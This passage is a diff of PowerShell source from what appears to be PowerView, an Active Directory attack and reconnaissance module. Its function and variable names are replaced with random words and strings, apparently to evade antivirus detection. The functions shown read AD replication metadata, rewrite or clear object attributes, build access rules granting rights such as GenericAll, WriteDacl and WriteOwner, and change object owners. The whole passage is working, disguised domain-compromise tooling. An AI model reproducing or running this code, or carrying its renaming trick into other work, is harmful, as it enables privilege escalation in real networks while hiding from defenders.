+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['Properties']) {
-            $VhjUUHmm99 = $PSBoundParameters['Properties'] -Join '|'
+            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
         }
         else {
-            $VhjUUHmm99 = ''
+            $PropertyFilter = ''
         }
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
-        farrowing @SearcherArguments | ForEach-Object {
-            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
-            ForEach($gsLTSbEi99 in $_.Properties['msds-replvaluemetadata']) {
-                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
-                if ($pczMbpLs99) {
-                    if ($pczMbpLs99.pszAttributeName -Match $VhjUUHmm99) {
-                        $ERfozkEO99 = New-Object PSObject
-                        $ERfozkEO99 | Add-Member NoteProperty 'ObjectDN' $HxrwipaH99
-                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeName' $pczMbpLs99.pszAttributeName
-                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeValue' $pczMbpLs99.pszObjectDn
-                        $ERfozkEO99 | Add-Member NoteProperty 'TimeCreated' $pczMbpLs99.ftimeCreated
-                        $ERfozkEO99 | Add-Member NoteProperty 'TimeDeleted' $pczMbpLs99.ftimeDeleted
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
-                        $ERfozkEO99 | Add-Member NoteProperty 'Version' $pczMbpLs99.dwVersion
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
-                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
-                        $ERfozkEO99
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
+        dermatitis @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
+                if ($TempObject) {
+                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
+                        $Output = New-Object PSObject
+                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
+                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
+                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
+                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
+                        $Output
                     }
                 }
                 else {
-                    Write-Verbose "[Christine] Error retrieving 'msds-replvaluemetadata' for '$HxrwipaH99'"
+                    Write-Verbose "[sandlots] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
     }
 }
-function backlashes {
+function Rena {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -3456,7 +3456,7 @@ function backlashes {
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [Alias('Replace')]
         [Hashtable]
@@ -3469,96 +3469,96 @@ function backlashes {
         $Clear,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{'Raw' = $True}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        $SearcherArguments = @{'Raw' = $True}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
-        $FHZdVnWh99 = farrowing @SearcherArguments
-        ForEach ($Object in $FHZdVnWh99) {
-            $Entry = $FHZdVnWh99.GetDirectoryEntry()
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
+        $RawObject = dermatitis @SearcherArguments
+        ForEach ($Object in $RawObject) {
+            $Entry = $RawObject.GetDirectoryEntry()
             if($PSBoundParameters['Set']) {
                 try {
                     $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
-                        Write-Verbose "[backlashes] Setting '$($_.Name)' to '$($_.Value)' for object '$($FHZdVnWh99.Properties.samaccountname)'"
+                        Write-Verbose "[Rena] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                         $Entry.put($_.Name, $_.Value)
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[backlashes] Error setting/replacing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
+                    Write-Warning "[Rena] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
             if($PSBoundParameters['XOR']) {
                 try {
                     $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
-                        $WvaSMHXh99 = $_.Name
-                        $vlAIDdgk99 = $_.Value
-                        Write-Verbose "[backlashes] XORing '$WvaSMHXh99' with '$vlAIDdgk99' for object '$($FHZdVnWh99.Properties.samaccountname)'"
-                        $dulUfSqM99 = $Entry.$WvaSMHXh99[0].GetType().name
-                        $iJggqKLY99 = $($Entry.$WvaSMHXh99) -bxor $vlAIDdgk99
-                        $Entry.$WvaSMHXh99 = $iJggqKLY99 -as $dulUfSqM99
+                        $PropertyName = $_.Name
+                        $PropertyXorValue = $_.Value
+                        Write-Verbose "[Rena] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
+                        $TypeName = $Entry.$PropertyName[0].GetType().name
+                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
+                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[backlashes] Error XOR'ing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
+                    Write-Warning "[Rena] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
             if($PSBoundParameters['Clear']) {
                 try {
                     $PSBoundParameters['Clear'] | ForEach-Object {
-                        $WvaSMHXh99 = $_
-                        Write-Verbose "[backlashes] Clearing '$WvaSMHXh99' for object '$($FHZdVnWh99.Properties.samaccountname)'"
-                        $Entry.$WvaSMHXh99.clear()
+                        $PropertyName = $_
+                        Write-Verbose "[Rena] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
+                        $Entry.$PropertyName.clear()
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning "[backlashes] Error clearing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
+                    Write-Warning "[Rena] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                 }
             }
         }
     }
 }
-function Michiganders {
+function esthetic {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LogonHours')]
@@ -3567,50 +3567,50 @@ function Michiganders {
         [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [byte[]]
-        $BGKGrzXI99
+        $LogonHoursArray
     )
     Begin {
-        if($BGKGrzXI99.Count -ne 21) {
+        if($LogonHoursArray.Count -ne 21) {
             throw "LogonHoursArray is the incorrect length"
         }
-        function regulating {
+        function bedsides {
             Param (
                 [int[]]
-                $irSgbaxI99
+                $HoursArr
             )
-            $ufgHjSUU99 = New-Object bool[] 24
+            $LogonHours = New-Object bool[] 24
             for($i=0; $i -lt 3; $i++) {
-                $Byte = $irSgbaxI99[$i]
-                $KUsFrgdb99 = $i * 8
+                $Byte = $HoursArr[$i]
+                $Offset = $i * 8
                 $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
-                $ufgHjSUU99[$KUsFrgdb99+0] = [bool] [convert]::ToInt32([string]$Str[7])
-                $ufgHjSUU99[$KUsFrgdb99+1] = [bool] [convert]::ToInt32([string]$Str[6])
-                $ufgHjSUU99[$KUsFrgdb99+2] = [bool] [convert]::ToInt32([string]$Str[5])
-                $ufgHjSUU99[$KUsFrgdb99+3] = [bool] [convert]::ToInt32([string]$Str[4])
-                $ufgHjSUU99[$KUsFrgdb99+4] = [bool] [convert]::ToInt32([string]$Str[3])
-                $ufgHjSUU99[$KUsFrgdb99+5] = [bool] [convert]::ToInt32([string]$Str[2])
-                $ufgHjSUU99[$KUsFrgdb99+6] = [bool] [convert]::ToInt32([string]$Str[1])
-                $ufgHjSUU99[$KUsFrgdb99+7] = [bool] [convert]::ToInt32([string]$Str[0])
+                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
+                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
+                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
+                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
+                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
+                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
+                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
+                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
             }
-            $ufgHjSUU99
+            $LogonHours
         }
     }
     Process {
-        $ERfozkEO99 = @{
-            Sunday = regulating -HoursArr $BGKGrzXI99[0..2]
-            Monday = regulating -HoursArr $BGKGrzXI99[3..5]
-            Tuesday = regulating -HoursArr $BGKGrzXI99[6..8]
-            Wednesday = regulating -HoursArr $BGKGrzXI99[9..11]
-            Thurs = regulating -HoursArr $BGKGrzXI99[12..14]
-            Friday = regulating -HoursArr $BGKGrzXI99[15..17]
-            Saturday = regulating -HoursArr $BGKGrzXI99[18..20]
+        $Output = @{
+            Sunday = bedsides -HoursArr $LogonHoursArray[0..2]
+            Monday = bedsides -HoursArr $LogonHoursArray[3..5]
+            Tuesday = bedsides -HoursArr $LogonHoursArray[6..8]
+            Wednesday = bedsides -HoursArr $LogonHoursArray[9..11]
+            Thurs = bedsides -HoursArr $LogonHoursArray[12..14]
+            Friday = bedsides -HoursArr $LogonHoursArray[15..17]
+            Saturday = bedsides -HoursArr $LogonHoursArray[18..20]
         }
-        $ERfozkEO99 = New-Object PSObject -Property $ERfozkEO99
-        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
-        $ERfozkEO99
+        $Output = New-Object PSObject -Property $Output
+        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
+        $Output
     }
 }
-function thickness {
+function palm {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Security.AccessControl.AuthorizationRule')]
@@ -3619,116 +3619,116 @@ function thickness {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String]
-        $yhJclZId99,
+        $PrincipalIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $fcfzDfVI99,
+        $PrincipalDomain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Parameter(Mandatory = $True)]
         [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
         $Right,
         [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
         [ValidateSet('Allow', 'Deny')]
         [String[]]
-        $Ulxtslfm99,
+        $AccessControlType,
         [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
         [ValidateSet('Success', 'Failure')]
         [String]
-        $YtPCMRKx99,
+        $AuditFlag,
         [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
         [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
         [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
         [Guid]
-        $XmSculID99,
+        $ObjectType,
         [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
         [String]
-        $ARVPipoY99,
+        $InheritanceType,
         [Guid]
-        $pHXTVyEm99
+        $InheritedObjectType
     )
     Begin {
-        if ($yhJclZId99 -notmatch '^S-1-.*') {
-            $hBSkMWAr99 = @{
-                'Identity' = $yhJclZId99
+        if ($PrincipalIdentity -notmatch '^S-1-.*') {
+            $PrincipalSearcherArguments = @{
+                'Identity' = $PrincipalIdentity
                 'Properties' = 'distinguishedname,objectsid'
             }
-            if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
-            if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
-            if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
-            if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
-            if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
-            if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
-            $KLoeydcd99 = farrowing @PrincipalSearcherArguments
-            if (-not $KLoeydcd99) {
-                throw "Unable to resolve principal: $yhJclZId99"
+            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+            $Principal = dermatitis @PrincipalSearcherArguments
+            if (-not $Principal) {
+                throw "Unable to resolve principal: $PrincipalIdentity"
             }
-            elseif($KLoeydcd99.Count -gt 1) {
+            elseif($Principal.Count -gt 1) {
                 throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
             }
-            $vEAcbmpj99 = $KLoeydcd99.objectsid
+            $ObjectSid = $Principal.objectsid
         }
         else {
-            $vEAcbmpj99 = $yhJclZId99
+            $ObjectSid = $PrincipalIdentity
         }
-        $CErpbdPZ99 = 0
+        $ADRight = 0
         foreach($r in $Right) {
-            $CErpbdPZ99 = $CErpbdPZ99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
+            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
         }
-        $CErpbdPZ99 = [System.DirectoryServices.ActiveDirectoryRights]$CErpbdPZ99
-        $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$vEAcbmpj99)
+        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight
+        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
     }
     Process {
         if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
-            if($XmSculID99 -eq $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99
-            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99)
-            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99), $pHXTVyEm99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99, $ARVPipoY99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $YtPCMRKx99, $XmSculID99, $ARVPipoY99, $pHXTVyEm99
+            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
+            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
+            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
+            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
+            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
+            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
             }
         }
         else {
-            if($XmSculID99 -eq $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99
-            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99)
-            } elseif($XmSculID99 -eq $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ARVPipoY99), $pHXTVyEm99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -eq [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -eq $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99, $ARVPipoY99
-            } elseif($XmSculID99 -ne $null -and $ARVPipoY99 -ne [String]::Empty -and $pHXTVyEm99 -ne $null) {
-                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $BfpbWwpi99, $CErpbdPZ99, $Ulxtslfm99, $XmSculID99, $ARVPipoY99, $pHXTVyEm99
+            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
+            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
+            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
+            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
+            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
+            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
+                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
             }
         }
     }
 }
-function Lafitte {
+function stript {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -3736,82 +3736,82 @@ function Lafitte {
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [Alias('Owner')]
         [String]
-        $FXydyfnV99,
+        $OwnerIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $PqVjzRLd99 = farrowing @SearcherArguments -Identity $FXydyfnV99 -Properties objectsid | Select-Object -ExpandProperty objectsid
-        if ($PqVjzRLd99) {
